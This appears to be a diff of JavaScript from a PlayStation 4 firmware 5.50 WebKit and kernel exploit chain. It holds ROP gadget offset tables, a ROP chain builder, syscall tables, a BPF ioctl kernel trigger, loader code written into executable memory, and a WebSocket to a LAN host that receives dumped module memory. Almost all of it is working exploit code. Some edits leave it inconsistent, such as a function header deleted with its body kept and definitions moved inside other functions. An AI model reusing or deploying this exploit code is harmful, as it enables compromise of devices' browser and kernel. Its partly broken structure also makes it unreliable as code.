@@ -27,7 +27,7 @@ var dumpModuleXHR = function(moduleBase) {
     var chunk = new ArrayBuffer(0x1000);
     var chunk32 = new Uint32Array(chunk);
     var chunk8 = new Uint8Array(chunk);
-    
+    connection = new WebSocket('ws://192.168.43.6:8000');
     connection.binaryType = "arraybuffer";
     var helo = new Uint32Array(1);
     helo[0] = 0x41414141;
@@ -99,13 +99,11 @@ gadgets = {
   "memcpy":                 0x000000F8,
   "setjmp":                 0x00001468
 };
-
 var reenter_help = { length:
     { valueOf: function(){
         return 0;
     }
 }};
-
 
 window.stage2 = function() {
     try {
@@ -114,68 +112,8 @@ window.stage2 = function() {
         print(e);
     }
 }
-/* For storing the gadget and import map */
-window.GadgetMap = [];
-window.basicImportMap = [];
-
-/* Simply adds given offset to given module's base address */
-function getGadget(moduleName, offset) {
-    return add2(window.ECore.moduleBaseAddresses[moduleName], offset);
-}
-
-/* All function stubs / imports from other modules */
-var generateBasicImportMap = function() {
-    window.basicImportMap = {
-        '5.50': {
-            'setjmp': getGadget('libSceWebKit2', 0x14F8), // setjmp imported from libkernel
-            '__stack_chk_fail_ptr': getGadget('libSceWebKit2', 0x384BA40), // pointer to pointer to stack_chk_fail imported from libkernel -> look at epilogs to find this
-            "sceKernelLoadStartModule": getGadget('libkernel', 0x31470), // dump libkernel using the stack_chk_fail pointer to find base, then look for _sceKernelLoadStartModule
-        }
-    };
-}
-var gadgetmap_wk = function() {
-    window.gadgetmap = {
-        '5.50': {
-            'pop rsi': getGadget('libSceWebKit2', 0x0008f38a), // 0x000000000008f38a : pop rsi ; ret // 5ec3
-            'pop rdi': getGadget('libSceWebKit2', 0x00038dba), // pop rdi ; ret
-            'pop rax': getGadget('libSceWebKit2', 0x000043f5), // pop rax ; ret
-            'pop rcx': getGadget('libSceWebKit2', 0x00052e59), // pop rcx ; ret
-            'pop rdx': getGadget('libSceWebKit2', 0x000dedc2), // pop rdx ; ret
-            'pop r8': getGadget('libSceWebKit2', 0x000179c5), // pop r8 ; ret
-            'pop r9': getGadget('libSceWebKit2', 0x00bb30cf), // pop r9 ; ret
-            'pop rsp': getGadget('libSceWebKit2', 0x0001e687), // pop rsp ; ret
-            'push rax': getGadget('libSceWebKit2', 0x0017778e), // push rax ; ret  ;
-            'mov rax, rdi': getGadget('libSceWebKit2', 0x000058d0), // mov rax, rdi ; ret
-            'mov rax, rdx': getGadget('libSceWebKit2', 0x001cee60), // 0x00000000001cee60 : mov rax, rdx ; ret // 4889d0c3
-            'add rax, rcx': getGadget('libSceWebKit2', 0x00015172), // add rax, rcx ; ret
-            'mov qword ptr [rdi], rax': getGadget('libSceWebKit2', 0x0014536b), // mov qword ptr [rdi], rax ; ret 
-            'mov qword ptr [rdi], rsi': getGadget('libSceWebKit2', 0x00023ac2), // mov qword ptr [rdi], rsi ; ret
-            'mov rax, qword ptr [rax]': getGadget('libSceWebKit2', 0x0006c83a), // mov rax, qword ptr [rax] ; ret
-            'ret': getGadget('libSceWebKit2', 0x0000003c), // ret  ;
-            'nop': getGadget('libSceWebKit2', 0x00002f8f), // 0x0000000000002f8f : nop ; ret // 90c3
-
-            'syscall': getGadget('libSceWebKit2', 0x2264DBC), // syscall  ; ret
-
-            'jmp rax': getGadget('libSceWebKit2', 0x00000082), // jmp rax ;
-            'jmp r8': getGadget('libSceWebKit2', 0x00201860), // jmp r8 ;
-            'jmp r9': getGadget('libSceWebKit2', 0x001ce976), // jmp r9 ;
-            'jmp r11': getGadget('libSceWebKit2', 0x0017e73a), // jmp r11 ;
-            'jmp r15': getGadget('libSceWebKit2', 0x002f9f6d), // jmp r15 ;
-            'jmp rbp': getGadget('libSceWebKit2', 0x001fb8bd), // jmp rbp ;
-            'jmp rbx': getGadget('libSceWebKit2', 0x00039bd2), // jmp rbx ;
-            'jmp rcx': getGadget('libSceWebKit2', 0x0000dee3), // jmp rcx ;
-            'jmp rdi': getGadget('libSceWebKit2', 0x000b479c), // jmp rdi ;
-            'jmp rdx': getGadget('libSceWebKit2', 0x0000e3d0), // jmp rdx ;
-            'jmp rsi': getGadget('libSceWebKit2', 0x0002e004), // jmp rsi ;
-            'jmp rsp': getGadget('libSceWebKit2', 0x0029e6ad), // jmp rsp ;
-
-            // 0x013d1a00 : mov rdi, qword ptr [rdi] ; mov rax, qword ptr [rdi] ; mov rax, qword ptr [rax] ; jmp rax // 488b3f488b07488b00ffe0   
-            // 0x00d65230: mov rdi, qword [rdi+0x18] ; mov rax, qword [rdi] ; mov rax, qword [rax+0x58] ; jmp rax ;  // 48 8B 7F 18 48 8B 07 48  8B 40 58 FF E0
-            'jmp addr': getGadget('libSceWebKit2', 0x00d65230),
-        }
-    };
-}
-var gadgetcache = {"ret":60,
+var gadgetcache = {
+"ret":60,
 "ep":173,
 "pop rbp":182,
 "pop rax":17781,
@@ -192,7 +130,7 @@ var gadgetcache = {"ret":60,
 "mov [rax], rsi":2484823,
 "pop r9":21430095,
 "infloop":22604906},
- gadgeton = {};
+ gadgetoffs = {};
  
 window.stage2_ = function() {
     p = window.prim;
@@ -204,10 +142,9 @@ window.stage2_ = function() {
         var fptr_store = p.leakval(func);
         return (p.read8(fptr_store.add32(0x18))).add32(0x40);
     }
-    gadgetconn = 0;
+     gadgetconn = 0;
     if (!gadgets)
         gadgetconn = new WebSocket('ws://192.168.43.6:8000');
-     
 
     var parseFloatStore = p.leakfunc(parseFloat);
     var parseFloatPtr = p.read8(parseFloatStore);
@@ -371,6 +308,7 @@ window.stage2_ = function() {
 
     var launch_chain = function(chain)
     {
+      var stackBase    = 0;
       var stackPointer = 0;
       var stackCookie = 0;
       var orig_reenter_rip = 0;
@@ -415,25 +353,41 @@ window.stage2_ = function() {
         rtv=Array.prototype.splice.apply(reenter_help);
         return p.leakval(rtv);
     }
+        var krop = function (p, addr) {
+        // Contains base and stack pointer for fake stack (this.stackBase = RBP, this.stackPointer = RSP)
+        this.stackBase    = addr;
+        this.stackPointer = 0;
+
+        // Push instruction / value onto fake stack
+        this.push = function (val) {
+        p.write8(this.stackBase.add32(this.stackPointer), val);
+        this.stackPointer += 8;
+    };
+
+       // Write to address with value (helper function)
+        this.write64 = function (addr, val) {
+        this.push(window.gadgets["pop rdi"]);
+        this.push(addr);
+        this.push(window.gadgets["pop rax"]);
+        this.push(val);
+        this.push(window.gadgets["mov [rdi], rax"]);
+  }
+
+  // Return krop object
+  return this;
+}; 
+
 
     p.loadchain = launch_chain;
-    
-     // Write to address with value (helper function)
-  this.write64 = function (addr, val) {
-    this.push(window.gadgets["pop rdi"]);
-    this.push(addr);
-    this.push(window.gadgets["pop rax"]);
-    this.push(val);
-    this.push(window.gadgets["mov [rdi], rax"]);
-  }
-    
     window.RopChain = function () {
         this.ropframe = new Uint32Array(0x10000);
         this.ropframeptr = p.read8(p.leakval(this.ropframe).add32(0x10));
         this.count = 0;
+        
         this.clear = function() {
             this.count = 0;
             this.runtime = undefined;
+            
             for (var i = 0; i < 0x1000/8; i++)
             {
                 p.write8(this.ropframeptr.add32(i*8), 0);
@@ -458,31 +412,45 @@ window.stage2_ = function() {
             this.push(gadgets["mov [rdi], rsi"]); // perform write
         }
         this.fcall = function (rip, rdi, rsi, rdx, rcx, r8, r9)
-        {
-            this.push(gadgets["pop rdi"]); // pop rdi
-            this.push(rdi); // what
-            this.push(gadgets["pop rsi"]); // pop rsi
-            this.push(rsi); // what
-            this.push(gadgets["pop rdx"]); // pop rdx
-            this.push(rdx); // what
-            this.push(gadgets["pop rcx"]); // pop r10
-            this.push(rcx); // what
-            this.push(gadgets["pop r8"]); // pop r8
-            this.push(r8); // what
-            this.push(gadgets["pop r9"]); // pop r9
-            this.push(r9); // what
-            this.push(rip); // jmp
-            return this;
-        }
-        
-        this.run = function() {
-            var retv = p.loadchain(this, this.notimes);
-            this.clear();
-            return retv;
-        }
-        
-        return this;
-    };
+  {
+    if (rdi != undefined) {
+      this.push(gadgets["pop rdi"]); // pop rdi
+      this.push(rdi); // what
+    }
+    if (rsi != undefined) {
+      this.push(gadgets["pop rsi"]); // pop rsi
+      this.push(rsi); // what
+    }
+    if (rdx != undefined) {
+      this.push(gadgets["pop rdx"]); // pop rdx
+      this.push(rdx); // what
+    }
+    if (rcx != undefined) {
+      this.push(gadgets["pop rcx"]); // pop r10
+      this.push(rcx); // what
+    }
+    if (r8 != undefined) {
+      this.push(gadgets["pop r8"]); // pop r8
+      this.push(r8); // what
+    }
+    if (r9 != undefined) {
+      this.push(gadgets["pop r9"]); // pop r9
+      this.push(r9); // what*/
+    }
+
+
+    this.push(rip); // jmp
+    return this;
+  }
+  
+  this.run = function() {
+      var retv = p.loadchain(this, this.notimes);
+      this.clear();
+      return retv;
+  }
+  
+  return this;
+};
     
     var RopChain = window.RopChain();
     window.syscallnames = {"exit": 1,
@@ -709,7 +677,7 @@ window.stage2_ = function() {
     "virtual_query": 572,
     "mdbg_call": 573,
     "sblock_create": 574,
-    "sblock_delete": 575,
+    "sys_sblock_delete": 575,
     "sblock_enter": 576,
     "sblock_exit": 577,
     "sblock_xenter": 578,
@@ -770,7 +738,65 @@ window.stage2_ = function() {
     window.nameforsyscall = swapkeyval(window.syscallnames);
     
     window.syscalls = {};
+         
 
+/* Simply adds given offset to given module's base address */
+function getGadget(moduleName, offset) {
+    return add2(window.ECore.moduleBaseAddresses[moduleName], offset);
+}
+var slowpath_jop = function() {
+    slowpath_jop = {
+        '5.50': {
+            'setjmp': getGadget('libSceWebKit2', 0x14F8), // setjmp imported from libkernel
+            '__stack_chk_fail_ptr': getGadget('libSceWebKit2', 0x384BA40), // pointer to pointer to stack_chk_fail imported from libkernel -> look at epilogs to find this
+            "sceKernelLoadStartModule": getGadget('libkernel', 0x31470), // dump libkernel using the stack_chk_fail pointer to find base, then look for _sceKernelLoadStartModule
+        }
+    };
+}
+
+/* All gadgets from the binary of available modules */
+var gadgetmap_wk = function() {
+    gadgetmap_wk = {
+        '5.50': {
+            'pop rsi': getGadget('libSceWebKit2', 0x0008f38a), // 0x000000000008f38a : pop rsi ; ret // 5ec3
+            'pop rdi': getGadget('libSceWebKit2', 0x00038dba), // pop rdi ; ret
+            'pop rax': getGadget('libSceWebKit2', 0x000043f5), // pop rax ; ret
+            'pop rcx': getGadget('libSceWebKit2', 0x00052e59), // pop rcx ; ret
+            'pop rdx': getGadget('libSceWebKit2', 0x000dedc2), // pop rdx ; ret
+            'pop r8': getGadget('libSceWebKit2', 0x000179c5), // pop r8 ; ret
+            'pop r9': getGadget('libSceWebKit2', 0x00bb30cf), // pop r9 ; ret
+            'pop rsp': getGadget('libSceWebKit2', 0x0001e687), // pop rsp ; ret
+            'push rax': getGadget('libSceWebKit2', 0x0017778e), // push rax ; ret  ;
+            'mov rax, rdi': getGadget('libSceWebKit2', 0x000058d0), // mov rax, rdi ; ret
+            'mov rax, rdx': getGadget('libSceWebKit2', 0x001cee60), // 0x00000000001cee60 : mov rax, rdx ; ret // 4889d0c3
+            'add rax, rcx': getGadget('libSceWebKit2', 0x00015172), // add rax, rcx ; ret
+            'mov qword ptr [rdi], rax': getGadget('libSceWebKit2', 0x0014536b), // mov qword ptr [rdi], rax ; ret 
+            'mov qword ptr [rdi], rsi': getGadget('libSceWebKit2', 0x00023ac2), // mov qword ptr [rdi], rsi ; ret
+            'mov rax, qword ptr [rax]': getGadget('libSceWebKit2', 0x0006c83a), // mov rax, qword ptr [rax] ; ret
+            'ret': getGadget('libSceWebKit2', 0x0000003c), // ret  ;
+            'nop': getGadget('libSceWebKit2', 0x00002f8f), // 0x0000000000002f8f : nop ; ret // 90c3
+
+            'syscall': getGadget('libSceWebKit2', 0x2264DBC), // syscall  ; ret
+
+            'jmp rax': getGadget('libSceWebKit2', 0x00000082), // jmp rax ;
+            'jmp r8': getGadget('libSceWebKit2', 0x00201860), // jmp r8 ;
+            'jmp r9': getGadget('libSceWebKit2', 0x001ce976), // jmp r9 ;
+            'jmp r11': getGadget('libSceWebKit2', 0x0017e73a), // jmp r11 ;
+            'jmp r15': getGadget('libSceWebKit2', 0x002f9f6d), // jmp r15 ;
+            'jmp rbp': getGadget('libSceWebKit2', 0x001fb8bd), // jmp rbp ;
+            'jmp rbx': getGadget('libSceWebKit2', 0x00039bd2), // jmp rbx ;
+            'jmp rcx': getGadget('libSceWebKit2', 0x0000dee3), // jmp rcx ;
+            'jmp rdi': getGadget('libSceWebKit2', 0x000b479c), // jmp rdi ;
+            'jmp rdx': getGadget('libSceWebKit2', 0x0000e3d0), // jmp rdx ;
+            'jmp rsi': getGadget('libSceWebKit2', 0x0002e004), // jmp rsi ;
+            'jmp rsp': getGadget('libSceWebKit2', 0x0029e6ad), // jmp rsp ;
+
+            // 0x013d1a00 : mov rdi, qword ptr [rdi] ; mov rax, qword ptr [rdi] ; mov rax, qword ptr [rax] ; jmp rax // 488b3f488b07488b00ffe0   
+            // 0x00d65230: mov rdi, qword [rdi+0x18] ; mov rax, qword [rdi] ; mov rax, qword [rax+0x58] ; jmp rax ;  // 48 8B 7F 18 48 8B 07 48  8B 40 58 FF E0
+            'jmp addr': getGadget('libSceWebKit2', 0x00d65230),
+        }
+    };
+}
  
     log("--- welcome to stage3 ---");
     
@@ -888,15 +914,6 @@ window.stage2_ = function() {
 
   window.nogc.push(backing);
   
-      var spawnthread = function (chain) {
-      var longjmp       = offsetToWebKit(0x1458);
-      var createThread  = offsetToWebKit(0x116ED40);
-
-      var contextp = mallocu32(0x2000);
-      var contextz = contextp.backing;
-      contextz[0] = 1337;
-      p.syscall(324, 1);
-  
       var thread2 = new window.rop();
 
       thread2.clear();
@@ -916,7 +933,7 @@ window.stage2_ = function() {
       window.nogc.push(thread2);
       
       return thread2;
-      }
+      
       
       var run_count = 0;
 
@@ -1184,8 +1201,7 @@ window.stage2_ = function() {
 
       // ioctl() with valid BPF program will trigger free() of old program and reallocate memory for the new one 
    
-     // ioctl() with valid BPF program will trigger free() of old program and reallocate memory for the new one
-      spawnthread(function (thread2) {
+   spawnthread(function (thread2) {
         interrupt1 = thread2.stackBase;
         thread2.push(window.gadgets["ret"]);
         thread2.push(window.gadgets["ret"]);
@@ -1231,8 +1247,7 @@ window.stage2_ = function() {
      /////////////////// STAGE 3: Trigger ///////////////////
      var scratch = malloc(0x200);
      var test = kernel_rop_run(fd1, scratch);
-     
-     
+  
      
      // create loader memory
     var code_addr = new int64(0x26100000, 0x00000009);
@@ -1246,12 +1261,9 @@ window.stage2_ = function() {
       var thr_name = malloc(0x10);
       p.writeString(thr_name, "loader");
       
-      // write loader
-      writeLoader(p, code_addr);
-      
      var createRet = p.fcall(scePthreadCreate, thread, 0, code_addr, 0, thr_name);
     }
-     
+    
       // write dummy loader
       for (var i = 0; i < loader.length; i++) {
           p.write4(code_addr.add32(i * 4), loader[i]);
